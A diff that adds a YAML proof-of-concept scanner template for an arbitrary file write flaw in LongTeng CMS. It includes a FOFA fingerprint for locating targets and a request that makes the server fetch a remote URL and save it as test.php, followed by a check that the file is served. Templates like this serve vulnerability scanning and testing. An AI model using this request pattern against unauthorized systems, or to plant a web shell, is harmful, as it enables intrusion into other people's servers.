@@ -1,0 +1,27 @@
+id: poc-yaml-wanglongcn-ltcms-downloadfile-read
+info:
+  name: 龙腾CMS downloadfile任意文件写入
+  severity: critical
+  tags:
+  - 任意写入
+  finger: 龙腾CMS
+  fofa: icon_hash="-803002403"
+requests:
+- method: GET
+  path: /api/file/multiDownload?file=http://www.baidu.com/&savePath=test.php
+  expression: 'status_code == 200 &&
+
+    body == ""
+
+    '
+- method: GET
+  path: /test.php
+  expression: 'status_code == 200 &&
+
+    contains(body,"全球领先的中文搜索引擎、致力于让网民更便捷地获取信息") &&
+
+    contains(body,"百度一下，你就知道")
+
+    '
+variables: {}
+transport: http
